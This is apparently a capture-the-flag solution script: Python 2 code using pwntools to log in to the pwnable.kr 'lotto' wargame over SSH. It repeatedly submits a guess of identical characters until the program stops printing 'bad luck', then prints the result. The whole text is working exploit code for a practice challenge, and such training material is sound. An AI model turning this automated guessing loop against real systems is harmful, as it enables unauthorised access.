from pwn import *

s = ssh(host='pwnable.kr',
        port=2222,
        user='lotto',
        password='guest')

sh = s.process(['lotto'])
while True:
    sh.readuntil("Exit")
    sh.sendline("1")
    sh.readuntil(":")
    sh.sendline("######")
    k = sh.readuntil("bad luck...", timeout=1)
    if not "bad" in k:
        sh.readuntil('\n')
        print sh.readuntil('\n')
        break
